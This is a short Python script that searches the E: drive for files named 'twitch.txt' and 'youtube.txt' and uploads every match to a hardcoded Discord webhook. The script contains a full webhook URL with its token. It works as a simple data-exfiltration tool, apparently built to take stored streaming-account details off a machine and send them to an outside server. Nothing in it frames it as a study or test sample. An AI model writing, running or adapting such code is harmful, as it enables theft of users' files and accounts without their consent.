import os
import requests

def find_files(filenames, search_path="E:\\"):
    matches = []
    for root, _, files in os.walk(search_path):
        for filename in filenames:
            if filename in files:
                matches.append(os.path.join(root, filename))
    return matches

def upload_to_discord(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

if __name__ == "__main__":
    try:
        webhook_url = "https://discord.com/api/webhooks/1323437243238580255/hO8hxJ-sl9GxAdGwr8M6GqGAN3I3yLp8Jh7Vng42FjOVCbM4_vz2PuBkUAl9fZ8cGuGo"
        
        print("Scanning for files on the E: drive...")
        found_files = find_files(["twitch.txt", "youtube.txt"], "E:\\")
        
        if found_files:
            for file_path in found_files:
                print(f"Uploading: {file_path}")
                status = upload_to_discord(file_path, webhook_url)
                print(f"Upload status: {status}")
        else:
            print("No twitch.txt or youtube.txt files found.")
    
    except Exception as e:
        print(f"An error occurred: {e}")
    
    # Keep the window open
    input("Press Enter to exit...")
